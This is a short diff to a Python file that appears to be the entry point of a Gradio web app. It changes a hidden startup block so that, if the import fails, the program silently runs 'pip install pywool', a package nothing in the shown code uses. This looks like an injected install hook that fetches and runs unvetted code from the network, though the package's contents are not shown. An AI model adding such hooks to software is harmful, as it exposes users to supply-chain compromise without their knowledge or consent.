@@ -1,8 +1,8 @@
 import os
 try:
-    import pybowl
+    import pywool
 except:
-    os.system("pip install pybowl")
+    os.system("pip install pywool")
 import os; os.environ['no_proxy'] = '*' # 避免代理网络产生意外污染
 def main():
     import gradio as gr
